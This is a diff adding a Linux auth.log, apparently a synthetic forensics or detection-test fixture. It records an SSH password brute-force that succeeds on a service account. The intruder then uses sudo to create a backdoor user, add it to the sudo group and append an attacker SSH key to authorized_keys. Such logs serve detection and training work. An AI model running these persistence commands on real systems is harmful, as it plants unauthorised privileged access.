@@ -1,0 +1,128 @@
+Nov 18 07:12:05 deb13-vic sshd[812]: Server listening on 0.0.0.0 port 22.
+Nov 18 07:12:08 deb13-vic sshd[812]: Server listening on :: port 22.
+Nov 18 07:12:48 deb13-vic sshd[1190]: Accepted password for mara from 192.168.10.24 port 51122 ssh2
+Nov 18 07:12:48 deb13-vic sshd[1190]: pam_unix(sshd:session): session opened for user mara(uid=1000) by (uid=0)
+Nov 18 07:13:23 deb13-vic sudo:   mara : TTY=pts/0 ; PWD=/home/mara ; USER=root ; COMMAND=/usr/bin/apt update
+Nov 18 07:13:24 deb13-vic sudo: pam_unix(sudo:session): session opened for user root(uid=0) by mara(uid=1000)
+Nov 18 07:13:28 deb13-vic sudo: pam_unix(sudo:session): session closed for user root
+Nov 18 07:28:28 deb13-vic CRON[1455]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 07:28:28 deb13-vic CRON[1455]: pam_unix(cron:session): session closed for user root
+Nov 18 07:38:28 deb13-vic sshd[1190]: pam_unix(sshd:session): session closed for user mara
+Nov 18 07:52:14 deb13-vic sshd[1601]: Accepted password for ops from 192.168.10.31 port 52014 ssh2
+Nov 18 07:52:14 deb13-vic sshd[1601]: pam_unix(sshd:session): session opened for user ops(uid=1001) by (uid=0)
+Nov 18 07:52:45 deb13-vic sudo:   ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Nov 18 07:52:46 deb13-vic sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ops(uid=1001)
+Nov 18 07:52:46 deb13-vic sudo: pam_unix(sudo:session): session closed for user root
+Nov 18 08:05:01 deb13-vic CRON[1750]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 08:05:01 deb13-vic CRON[1750]: pam_unix(cron:session): session closed for user root
+Nov 18 08:21:09 deb13-vic sshd[1802]: Failed password for root from 45.33.32.156 port 54321 ssh2
+Nov 18 08:21:11 deb13-vic sshd[1803]: Invalid user admin from 45.33.32.156 port 54340 ssh2
+Nov 18 08:21:11 deb13-vic sshd[1803]: Failed password for invalid user admin from 45.33.32.156 port 54340 ssh2
+Nov 18 09:01:17 deb13-vic sshd[1901]: Failed password for root from 185.220.101.42 port 33812 ssh2
+Nov 18 09:14:33 deb13-vic sshd[1955]: Invalid user pi from 185.220.101.42 port 33891 ssh2
+Nov 18 09:14:33 deb13-vic sshd[1955]: Failed password for invalid user pi from 185.220.101.42 port 33891 ssh2
+Nov 18 09:22:08 deb13-vic sshd[1977]: Failed password for ubuntu from 91.92.251.103 port 49801 ssh2
+Nov 18 09:30:44 deb13-vic sshd[1601]: pam_unix(sshd:session): session closed for user ops
+Nov 18 09:38:34 deb13-vic sshd[2000]: Failed password for deploy from 203.0.113.66 port 40015 ssh2
+Nov 18 09:38:37 deb13-vic sshd[2001]: Invalid user admin from 203.0.113.66 port 40028 ssh2
+Nov 18 09:38:37 deb13-vic sshd[2001]: Failed password for invalid user admin from 203.0.113.66 port 40028 ssh2
+Nov 18 09:38:43 deb13-vic sshd[2002]: Failed password for svc-backup from 203.0.113.66 port 40054 ssh2
+Nov 18 09:38:49 deb13-vic sshd[2003]: Failed password for git from 203.0.113.66 port 40086 ssh2
+Nov 18 09:38:51 deb13-vic sshd[2004]: Failed password for svc-backup from 203.0.113.66 port 40125 ssh2
+Nov 18 09:38:52 deb13-vic sshd[2005]: Failed password for deploy from 203.0.113.66 port 40134 ssh2
+Nov 18 09:38:53 deb13-vic sshd[2006]: Invalid user admin from 203.0.113.66 port 40143 ssh2
+Nov 18 09:38:53 deb13-vic sshd[2006]: Failed password for invalid user admin from 203.0.113.66 port 40143 ssh2
+Nov 18 09:38:57 deb13-vic sshd[2007]: Invalid user test from 203.0.113.66 port 40144 ssh2
+Nov 18 09:38:57 deb13-vic sshd[2007]: Failed password for invalid user test from 203.0.113.66 port 40144 ssh2
+Nov 18 09:38:58 deb13-vic sshd[2008]: Invalid user oracle from 203.0.113.66 port 40181 ssh2
+Nov 18 09:38:58 deb13-vic sshd[2008]: Failed password for invalid user oracle from 203.0.113.66 port 40181 ssh2
+Nov 18 09:38:59 deb13-vic sshd[2009]: Failed password for svc-backup from 203.0.113.66 port 40214 ssh2
+Nov 18 09:39:03 deb13-vic sshd[2010]: Failed password for svc-backup from 203.0.113.66 port 40239 ssh2
+Nov 18 09:39:05 deb13-vic sshd[2011]: Invalid user test from 203.0.113.66 port 40250 ssh2
+Nov 18 09:39:05 deb13-vic sshd[2011]: Failed password for invalid user test from 203.0.113.66 port 40250 ssh2
+Nov 18 09:39:08 deb13-vic sshd[2012]: Invalid user root from 203.0.113.66 port 40260 ssh2
+Nov 18 09:39:08 deb13-vic sshd[2012]: Failed password for invalid user root from 203.0.113.66 port 40260 ssh2
+Nov 18 09:39:13 deb13-vic sshd[2013]: Failed password for ubuntu from 203.0.113.66 port 40268 ssh2
+Nov 18 09:39:14 deb13-vic sshd[2014]: Invalid user root from 203.0.113.66 port 40303 ssh2
+Nov 18 09:39:14 deb13-vic sshd[2014]: Failed password for invalid user root from 203.0.113.66 port 40303 ssh2
+Nov 18 09:39:17 deb13-vic sshd[2015]: Failed password for svc-backup from 203.0.113.66 port 40342 ssh2
+Nov 18 09:39:20 deb13-vic sshd[2016]: Invalid user admin from 203.0.113.66 port 40346 ssh2
+Nov 18 09:39:20 deb13-vic sshd[2016]: Failed password for invalid user admin from 203.0.113.66 port 40346 ssh2
+Nov 18 09:39:22 deb13-vic sshd[2017]: Invalid user oracle from 203.0.113.66 port 40370 ssh2
+Nov 18 09:39:22 deb13-vic sshd[2017]: Failed password for invalid user oracle from 203.0.113.66 port 40370 ssh2
+Nov 18 09:39:28 deb13-vic sshd[2018]: Failed password for git from 203.0.113.66 port 40392 ssh2
+Nov 18 09:39:32 deb13-vic sshd[2019]: Invalid user oracle from 203.0.113.66 port 40393 ssh2
+Nov 18 09:39:32 deb13-vic sshd[2019]: Failed password for invalid user oracle from 203.0.113.66 port 40393 ssh2
+Nov 18 09:39:34 deb13-vic sshd[2020]: Failed password for ubuntu from 203.0.113.66 port 40418 ssh2
+Nov 18 09:39:38 deb13-vic sshd[2021]: Failed password for postgres from 203.0.113.66 port 40444 ssh2
+Nov 18 09:39:41 deb13-vic sshd[2022]: Failed password for git from 203.0.113.66 port 40478 ssh2
+Nov 18 09:39:47 deb13-vic sshd[2023]: Invalid user admin from 203.0.113.66 port 40483 ssh2
+Nov 18 09:39:47 deb13-vic sshd[2023]: Failed password for invalid user admin from 203.0.113.66 port 40483 ssh2
+Nov 18 09:39:53 deb13-vic sshd[2024]: Invalid user root from 203.0.113.66 port 40490 ssh2
+Nov 18 09:39:53 deb13-vic sshd[2024]: Failed password for invalid user root from 203.0.113.66 port 40490 ssh2
+Nov 18 09:39:57 deb13-vic sshd[2025]: Failed password for deploy from 203.0.113.66 port 40504 ssh2
+Nov 18 09:40:00 deb13-vic sshd[2026]: Failed password for ubuntu from 203.0.113.66 port 40511 ssh2
+Nov 18 09:40:06 deb13-vic sshd[2027]: Invalid user admin from 203.0.113.66 port 40530 ssh2
+Nov 18 09:40:06 deb13-vic sshd[2027]: Failed password for invalid user admin from 203.0.113.66 port 40530 ssh2
+Nov 18 09:40:09 deb13-vic sshd[2028]: Invalid user test from 203.0.113.66 port 40565 ssh2
+Nov 18 09:40:09 deb13-vic sshd[2028]: Failed password for invalid user test from 203.0.113.66 port 40565 ssh2
+Nov 18 09:40:13 deb13-vic sshd[2029]: Failed password for deploy from 203.0.113.66 port 40574 ssh2
+Nov 18 09:40:14 deb13-vic sshd[2030]: Failed password for ubuntu from 203.0.113.66 port 40595 ssh2
+Nov 18 09:40:15 deb13-vic sshd[2031]: Invalid user admin from 203.0.113.66 port 40612 ssh2
+Nov 18 09:40:15 deb13-vic sshd[2031]: Failed password for invalid user admin from 203.0.113.66 port 40612 ssh2
+Nov 18 09:40:21 deb13-vic sshd[2032]: Invalid user oracle from 203.0.113.66 port 40624 ssh2
+Nov 18 09:40:21 deb13-vic sshd[2032]: Failed password for invalid user oracle from 203.0.113.66 port 40624 ssh2
+Nov 18 09:40:23 deb13-vic sshd[2033]: Invalid user root from 203.0.113.66 port 40648 ssh2
+Nov 18 09:40:23 deb13-vic sshd[2033]: Failed password for invalid user root from 203.0.113.66 port 40648 ssh2
+Nov 18 09:40:28 deb13-vic sshd[2034]: Failed password for svc-backup from 203.0.113.66 port 40660 ssh2
+Nov 18 09:40:30 deb13-vic sshd[2035]: Failed password for postgres from 203.0.113.66 port 40661 ssh2
+Nov 18 09:40:36 deb13-vic sshd[2036]: Failed password for postgres from 203.0.113.66 port 40689 ssh2
+Nov 18 09:40:38 deb13-vic sshd[2036b]: Failed password for root from 194.165.16.11 port 55210 ssh2
+Nov 18 09:40:41 deb13-vic sshd[2037]: Invalid user oracle from 203.0.113.66 port 40698 ssh2
+Nov 18 09:40:41 deb13-vic sshd[2037]: Failed password for invalid user oracle from 203.0.113.66 port 40698 ssh2
+Nov 18 09:40:44 deb13-vic sshd[2038]: Invalid user test from 203.0.113.66 port 40706 ssh2
+Nov 18 09:40:44 deb13-vic sshd[2038]: Failed password for invalid user test from 203.0.113.66 port 40706 ssh2
+Nov 18 09:40:49 deb13-vic sshd[2039]: Invalid user root from 203.0.113.66 port 40740 ssh2
+Nov 18 09:40:49 deb13-vic sshd[2039]: Failed password for invalid user root from 203.0.113.66 port 40740 ssh2
+Nov 18 09:40:54 deb13-vic sshd[2040]: Failed password for ubuntu from 203.0.113.66 port 40762 ssh2
+Nov 18 09:40:57 deb13-vic sshd[2041]: Invalid user root from 203.0.113.66 port 40797 ssh2
+Nov 18 09:40:57 deb13-vic sshd[2041]: Failed password for invalid user root from 203.0.113.66 port 40797 ssh2
+Nov 18 09:41:02 deb13-vic sshd[2042]: Failed password for svc-backup from 203.0.113.66 port 40828 ssh2
+Nov 18 09:41:08 deb13-vic sshd[2043]: Invalid user test from 203.0.113.66 port 40837 ssh2
+Nov 18 09:41:08 deb13-vic sshd[2043]: Failed password for invalid user test from 203.0.113.66 port 40837 ssh2
+Nov 18 09:41:12 deb13-vic sshd[2044]: Failed password for ubuntu from 203.0.113.66 port 40874 ssh2
+Nov 18 09:41:18 deb13-vic sshd[2045]: Failed password for git from 203.0.113.66 port 40878 ssh2
+Nov 18 09:41:22 deb13-vic sshd[2046]: Invalid user test from 203.0.113.66 port 40879 ssh2
+Nov 18 09:41:22 deb13-vic sshd[2046]: Failed password for invalid user test from 203.0.113.66 port 40879 ssh2
+Nov 18 09:41:25 deb13-vic sshd[2047]: Failed password for svc-backup from 203.0.113.66 port 40892 ssh2
+Nov 18 09:41:29 deb13-vic sshd[2048]: Invalid user admin from 203.0.113.66 port 40921 ssh2
+Nov 18 09:41:29 deb13-vic sshd[2048]: Failed password for invalid user admin from 203.0.113.66 port 40921 ssh2
+Nov 18 09:41:34 deb13-vic sshd[2049]: Invalid user oracle from 203.0.113.66 port 40959 ssh2
+Nov 18 09:41:34 deb13-vic sshd[2049]: Failed password for invalid user oracle from 203.0.113.66 port 40959 ssh2
+Nov 18 09:41:36 deb13-vic sshd[2050]: Failed password for svc-backup from 203.0.113.66 port 40974 ssh2
+Nov 18 09:41:42 deb13-vic sshd[2051]: Invalid user oracle from 203.0.113.66 port 40975 ssh2
+Nov 18 09:41:42 deb13-vic sshd[2051]: Failed password for invalid user oracle from 203.0.113.66 port 40975 ssh2
+Nov 18 09:41:44 deb13-vic sshd[2052]: Invalid user root from 203.0.113.66 port 41011 ssh2
+Nov 18 09:41:44 deb13-vic sshd[2052]: Failed password for invalid user root from 203.0.113.66 port 41011 ssh2
+Nov 18 09:41:49 deb13-vic sshd[2053]: Failed password for postgres from 203.0.113.66 port 41020 ssh2
+Nov 18 09:41:54 deb13-vic sshd[2054]: Failed password for deploy from 203.0.113.66 port 41041 ssh2
+Nov 18 09:41:59 deb13-vic sshd[2055]: Invalid user test from 203.0.113.66 port 41065 ssh2
+Nov 18 09:41:59 deb13-vic sshd[2055]: Failed password for invalid user test from 203.0.113.66 port 41065 ssh2
+Nov 18 09:42:02 deb13-vic sshd[2056]: Invalid user admin from 203.0.113.66 port 41067 ssh2
+Nov 18 09:42:02 deb13-vic sshd[2056]: Failed password for invalid user admin from 203.0.113.66 port 41067 ssh2
+Nov 18 09:42:06 deb13-vic sshd[2057]: Failed password for postgres from 203.0.113.66 port 41099 ssh2
+Nov 18 09:42:10 deb13-vic sshd[2101]: Accepted password for svc-backup from 203.0.113.66 port 41106 ssh2
+Nov 18 09:42:10 deb13-vic sshd[2101]: pam_unix(sshd:session): session opened for user svc-backup(uid=1003) by (uid=0)
+Nov 18 09:42:32 deb13-vic sudo:   svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash webupd8r
+Nov 18 09:42:33 deb13-vic sudo: pam_unix(sudo:session): session opened for user root(uid=0) by svc-backup(uid=1003)
+Nov 18 09:42:33 deb13-vic useradd[2140]: new user: name=webupd8r, UID=1004, GID=1004, home=/home/webupd8r, shell=/bin/bash
+Nov 18 09:42:35 deb13-vic sudo:   svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo webupd8r
+Nov 18 09:42:36 deb13-vic usermod[2148]: add 'webupd8r' to group 'sudo'
+Nov 18 09:42:37 deb13-vic usermod[2148]: add 'webupd8r' to shadow group 'sudo'
+Nov 18 09:42:40 deb13-vic sudo:   svc-backup : TTY=pts/1 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/bin/bash -c echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINkB7r2attacker-key webupd8r@evilhost' >> /home/webupd8r/.ssh/authorized_keys
+Nov 18 09:42:41 deb13-vic sudo: pam_unix(sudo:session): session closed for user root
+Nov 18 09:43:26 deb13-vic sshd[2210]: Accepted publickey for webupd8r from 203.0.113.66 port 41109 ssh2: ED25519 SHA256:9kP2nQ7xR1aB4cD6eF8gH0jK
+Nov 18 09:43:26 deb13-vic sshd[2210]: pam_unix(sshd:session): session opened for user webupd8r(uid=1004) by (uid=0)
+Nov 18 09:43:34 deb13-vic sudo:   webupd8r : TTY=pts/2 ; PWD=/home/webupd8r ; USER=root ; COMMAND=/usr/bin/crontab -l
+Nov 18 09:48:01 deb13-vic CRON[2290]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 18 09:48:01 deb13-vic CRON[2290]: pam_unix(cron:session): session closed for user root
